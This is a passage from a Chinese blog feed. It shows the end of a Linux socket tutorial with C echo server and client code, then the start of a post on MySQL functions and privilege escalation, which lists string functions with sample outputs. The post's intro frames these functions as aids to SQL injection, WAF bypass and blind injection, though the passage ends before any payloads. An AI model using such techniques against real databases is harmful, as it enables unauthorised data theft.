class="comment">/*声明服务器地址和客户链接地址*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span> , <span class="title">cliaddr</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*声明服务器监听套接字和客户端链接套接字*/</span></span><br><span class="line"><span class="keyword">int</span> listenfd , connfd;</span><br><span class="line"><span class="keyword">pid_t</span> childpid;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*声明缓冲区*/</span></span><br><span class="line"><span class="keyword">char</span> buf[MAX_LINE];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">socklen_t</span> clilen;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(1) 初始化监听套接字listenfd*/</span></span><br><span class="line"><span class="keyword">if</span>((listenfd = socket(AF_INET , SOCK_STREAM , <span class="number">0</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;socket error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(2) 设置服务器sockaddr_in结构*/</span></span><br><span class="line">bzero(&amp;servaddr , <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line"> </span><br><span class="line">servaddr.sin_family = AF_INET;</span><br><span class="line">servaddr.sin_addr.s_addr = htonl(INADDR_ANY); <span class="comment">//表明可接受任意IP地址</span></span><br><span class="line">servaddr.sin_port = htons(PORT);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(3) 绑定套接字和端口*/</span></span><br><span class="line"><span class="keyword">if</span>(bind(listenfd , (struct sockaddr*)&amp;servaddr , <span class="keyword">sizeof</span>(servaddr)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;bind error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(4) 监听客户请求*/</span></span><br><span class="line"><span class="keyword">if</span>(listen(listenfd , LISTENQ) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;listen error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(5) 接受客户请求*/</span></span><br><span class="line"><span class="keyword">for</span>( ; ; )</span><br><span class="line">&#123;</span><br><span class="line">clilen = <span class="keyword">sizeof</span>(cliaddr);</span><br><span class="line"><span class="keyword">if</span>((connfd = accept(listenfd , (struct sockaddr *)&amp;cliaddr , &amp;clilen)) &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;accept error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//新建子进程单独处理链接</span></span><br><span class="line"><span class="keyword">if</span>((childpid = fork()) == <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">close(listenfd);</span><br><span class="line"><span class="comment">//str_echo</span></span><br><span class="line"><span class="keyword">ssize_t</span> n;</span><br><span class="line"><span class="keyword">char</span> buff[MAX_LINE];</span><br><span class="line"><span class="keyword">while</span>((n = read(connfd , buff , MAX_LINE)) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">write(connfd , buff , n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line">close(connfd);</span><br><span class="line">&#125;<span class="comment">//for</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*(6) 关闭监听套接字*/</span></span><br><span class="line">close(listenfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>client.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * client.c为客户端代码</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*readline函数实现*/</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">readline</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *vptr, <span class="keyword">size_t</span> maxlen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">ssize_t</span>n, rc;</span><br><span class="line"><span class="keyword">char</span>c, *ptr;</span><br><span class="line"> </span><br><span class="line">ptr = vptr;</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">1</span>; n &lt; maxlen; n++) &#123;</span><br><span class="line"><span class="keyword">if</span> ( (rc = read(fd, &amp;c,<span class="number">1</span>)) == <span class="number">1</span>) &#123;</span><br><span class="line">*ptr++ = c;</span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">/* newline is stored, like fgets() */</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">*ptr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span>(n - <span class="number">1</span>);<span class="comment">/* EOF, n - 1 bytes were read */</span></span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span>(<span class="number">-1</span>);<span class="comment">/* error, errno set by read() */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">*ptr = <span class="number">0</span>;<span class="comment">/* null terminate like fgets() */</span></span><br><span class="line"><span class="keyword">return</span>(n);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> ** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*声明套接字和链接服务器地址*/</span></span><br><span class="line"><span class="keyword">int</span> sockfd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*判断是否为合法输入*/</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;usage:tcpcli &lt;IPaddress&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(1) 创建套接字*/</span></span><br><span class="line"><span class="keyword">if</span>((sockfd = socket(AF_INET , SOCK_STREAM , <span class="number">0</span>)) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;socket error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(2) 设置链接服务器地址结构*/</span></span><br><span class="line">bzero(&amp;servaddr , <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line">servaddr.sin_family = AF_INET;</span><br><span class="line">servaddr.sin_port = htons(PORT);</span><br><span class="line"><span class="keyword">if</span>(inet_pton(AF_INET , argv[<span class="number">1</span>] , &amp;servaddr.sin_addr) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;inet_pton error for %s\n&quot;</span>,argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(3) 发送链接服务器请求*/</span></span><br><span class="line"><span class="keyword">if</span>( connect(sockfd , (struct sockaddr *)&amp;servaddr , <span class="keyword">sizeof</span>(servaddr)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;connect error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(4) 消息处理*/</span></span><br><span class="line"><span class="keyword">char</span> sendline[MAX_LINE] , recvline[MAX_LINE];</span><br><span class="line"><span class="keyword">while</span>(fgets(sendline , MAX_LINE , <span class="built_in">stdin</span>) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">write(sockfd , sendline , <span class="built_in">strlen</span>(sendline));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(readline(sockfd , recvline , MAX_LINE) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;server terminated prematurely&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">fputs</span>(recvline , <span class="built_in">stdout</span>) == EOF)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;fputs error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line">&#125;<span class="comment">//while</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(5) 关闭套接字*/</span></span><br><span class="line">close(sockfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210225173823677.png" alt="image-20210225173823677"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://www.cnblogs.com/dolphinx/p/3460545.html">简单理解Socket</a></p><p>[2] <a href="https://blog.csdn.net/fly_yr/article/details/50387065">基本套接字编程（1） – tcp篇</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL函数及提权</title>
      <link href="posts/22595.html"/>
      <url>posts/22595.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>在 sql 注入时为了应对各种限制措施，利用数据库自带的一些系统函数经过各种变换之后可以绕过一些 安全设备或者一些基础防御的措施，比如一些字符串转换的函数、截取字符串长度的函数等，</p><p> 应用的场景包括：通过注入获取数据、变换字符串绕过 WAF、盲注猜解字符数据等 </p></blockquote><h1 id="MySQL自带函数的功能与用法"><a href="#MySQL自带函数的功能与用法" class="headerlink" title="MySQL自带函数的功能与用法"></a>MySQL自带函数的功能与用法</h1><h2 id="MySQL-字符串函数"><a href="#MySQL-字符串函数" class="headerlink" title="MySQL 字符串函数"></a>MySQL 字符串函数</h2><p><strong>1.ASCII(s)</strong>   </p><p>返回字符串 s 的第一个字符的 ASCII 码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ASCII(&#39;MySQL&#39;) AS NumCodeOfFirstChar;</span><br><span class="line">+--------------------+</span><br><span class="line">| NumCodeOfFirstChar |</span><br><span class="line">+--------------------+</span><br><span class="line">|                 77 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>2.CHAR_LENGTH(s)</strong></p><p>返回字符串 s 的字符数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CHAR_LENGTH(&quot;MySQL&quot;) AS LengthOfString;</span><br><span class="line">+----------------+</span><br><span class="line">| LengthOfString |</span><br><span class="line">+----------------+</span><br><span class="line">|              5 |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>3.CONCAT(s1,s2…sn)</strong></p><p>字符串 s1,s2 等多个字符串合并为一个字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT CONCAT (&#39;I&#39;,&#39; &#39;,&#39;am&#39;,&#39; &#39;,&#39;learning&#39;,&#39; &#39;,&#39;MySQL&#39;,&#39;.&#39;) AS ConcatenatedString;</span><br><span class="line">+----------------------+</span><br><span class="line">| ConcatenatedString   |</span><br><span class="line">+----------------------+</span><br><span class="line">| I am learning MySQL. |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p><strong>注意区别  CONCAT_WS(x, s1,s2…sn)</strong></p><p>同 CONCAT(s1,s2,…) 函数，但是每个字符串之间要加上 x，x 可以是分隔符</p><p><strong>与  group_concat( [DISTINCT] 要连接的字段 [Order BY 排序字段 ASC/DESC] [Separator ‘分隔符’] )</strong></p><p>可配合<strong>group_by</strong>使用</p><p><strong>4.FIELD(s,s1,s2…)</strong></p><p>返回第一个字符串 s 在字符串列表(s1,s2…)中的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD(&quot;c&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| FIELD(&quot;c&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   3 |</span><br><span class="line">+-------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>5.FIND_IN_SET(s1,s2)</strong></p><p>返回在字符串s2中与s1匹配的字符串的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIND_IN_SET(&#39;c&#39;,&#39;a,b,c,d,e&#39;);</span><br><span class="line">+------------------------------+</span><br><span class="line">| FIND_IN_SET(&#39;c&#39;,&#39;a,b,c,d,e&#39;) |</span><br><span class="line">+------------------------------+</span><br><span class="line">|                            3 |</span><br><span class="line">+------------------------------+</span><br></pre></td></tr></table></figure><p><strong>6.FORMAT(x,n)</strong></p><p>函数可以将数字 x 进行格式化 “#,###.##”, 将 x 保留到小数点后 n 位，最后一位四舍五入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT FORMAT(3.1415926535,4);</span><br><span class="line">+------------------------+</span><br><span class="line">| FORMAT(3.1415926535,4) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 3.1416                 |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure><p><strong>7.INSERT(s1,x,len,s2)</strong></p><p>字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT INSERT(&#39;MySQL&#39;,1,2,&#39;Your&#39;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| INSERT(&#39;MySQL&#39;,1,2,&#39;Your&#39;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">| YourSQL                    |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure><p><strong>8.LOCATE(s1,s)</strong></p><p>从字符串 s 中获取 s1 的开始位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT LOCATE(&#39;SQL&#39;,&#39;MySQL&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| LOCATE(&#39;SQL&#39;,&#39;MySQL&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     3 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>9.LOWER(s)|LCASE(s)</strong></p><p>将字符串 s 的所有字母变成小写字母</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOWER(&#39;MYSQL&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| LOWER(&#39;MYSQL&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| mysql          |</span><br><span class="line">+----------------+</span><br><span class="line">SELECT LCASE(&#39;MYSQL&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| LCASE(&#39;MYSQL&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| mysql          |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>10.UPPER(s)|UCASE(s)</strong></p><p>将字符串 s 的所有字母变成大写字母</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT UPPER(&#39;mysql&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| UPPER(&#39;mysql&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| MYSQL          |</span><br><span class="line">+----------------+</span><br><span class="line">SELECT UCASE(&#39;mysql&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| UCASE(&#39;mysql&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| MYSQL          |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>11.LEFT(s,n)</strong></p><p>返回字符串 s 的前 n 个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LEFT(&#39;MySQL&#39;,2);</span><br><span class="line">+-----------------+</span><br><span class="line">| LEFT(&#39;MySQL&#39;,2) |</span><br><span class="line">+-----------------+</span><br><span class="line">| My              |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>12.RIGHT(s,n)</strong></p><p>返回字符串 s 的后 n 个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT RIGHT(&#39;MySQL&#39;,3);</span><br><span class="line">+------------------+</span><br><span class="line">| RIGHT(&#39;MySQL&#39;,3) |</span><br><span class="line">+------------------+</span><br><span class="line">| SQL              |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p><strong>13.LPAD(s1,len,s2)</strong></p><p>在字符串 s1 的开始处填充字符串 s2，使字符串长度达到 len</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT LPAD(&#39;SQL&#39;,7,&#39;My&#39;);</span><br><span class="line">+--------------------+</span><br><span class="line">| LPAD(&#39;SQL&#39;,7,&#39;My&#39;) |</span><br><span class="line">+--------------------+</span><br><span class="line">| MyMySQL            |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>14.RPAD(s1,len,s2)</strong></p><p>在字符串 s1 的结尾处添加字符串 s2，使字符串的长度达到 len</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT RPAD (&#39;My&#39;,8,&#39;SQL&#39;);</span><br><span class="line">+---------------------+</span><br><span class="line">| RPAD (&#39;My&#39;,8,&#39;SQL&#39;) |</span><br><span class="line">+---------------------+</span><br><span class="line">| MySQLSQL            |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><p><strong>15.LTRIM(s)</strong></p><p>去掉字符串 s 开始处的空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LTRIM(&#39;      MySQL&#39;) AS LeftTrimmedString;</span><br><span class="line">+-------------------+</span><br><span class="line">| LeftTrimmedString |</span><br><span class="line">+-------------------+</span><br><span class="line">| MySQL             |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>16.RTRIM(s)</strong></p><p>去掉字符串 s 结尾处的空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT RTRIM (&#39;MySQL      &#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| RTRIM (&#39;MySQL      &#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| MySQL                 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>17.TRIM(s)</strong></p><p>去掉字符串 s 开始和结尾处的空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TRIM(&#39;    MySQL    &#39;) AS TrimmedString;</span><br><span class="line">+---------------+</span><br><span class="line">| TrimmedString |</span><br><span class="line">+---------------+</span><br><span class="line">| MySQL         |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure><p><strong>18.MID(s,n,len)|SUBSTR(s, n, len)|SUBSTRING(s, n, len)</strong></p><p>从字符串 s 的 n 位置截取长度为 len 的子字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MID(&#39;MySQL&#39;,3,3) AS ExtractString;</span><br><span class="line">+---------------+</span><br><span class="line">| ExtractString |</span><br><span class="line">+---------------+</span><br><span class="line">| SQL           |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure><p><strong>19.REPEAT(s,n)</strong></p><p>将字符串 s 重复 n 次</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT REPEAT(&#39;MySQL&#39;,3);</span><br><span class="line">+-------------------+</span><br><span class="line">| REPEAT(&#39;MySQL&#39;,3) |</span><br><span class="line">+-------------------+</span><br><span class="line">| MySQLMySQLMySQL   |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>20.REPLACE(s,s1,s2)</strong></p><p>将字符串 s2 替代字符串 s 中的字符串 s1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT REPLACE (&#39;MySQL&#39;,&#39;My&#39;,&#39;Your&#39;);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| REPLACE (&#39;MySQL&#39;,&#39;My&#39;,&#39;Your&#39;) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| YourSQL                       |</span><br><span class="line">+-------------------------------+</span><br></pre></td></tr></table></figure><p><strong>21.REVERSE(s)</strong></p><p>将字符串s的顺序反过来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT REVERSE (&#39;MySQL&#39;);</span><br><span class="line">+-------------------+</span><br><span class="line">| REVERSE (&#39;MySQL&#39;) |</span><br><span class="line">+-------------------+</span><br><span class="line">| LQSyM             |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>22.SPACE (s)</strong></p><p>返回n个空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SPACE (10);</span><br><span class="line">+------------+</span><br><span class="line">| SPACE (10) |</span><br><span class="line">+------------+</span><br><span class="line">|            |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>23.STRCMP(s1,s2)</strong></p><p>比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT STRCMP (&#39;MySQL&#39;,&#39;MySQL&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| STRCMP (&#39;MySQL&#39;,&#39;MySQL&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                        0 |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>24.SUBSTRING_INDEX(s, delimiter, number)</strong></p><p>返回从字符串 s 的第 number 个出现的分隔符 delimiter 之后的子串。<br>如果 number 是正数，返回第 number 个字符左边的字符串。<br>如果 number 是负数，返回第(number 的绝对值(从右边数))个字符右边的字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SELECT 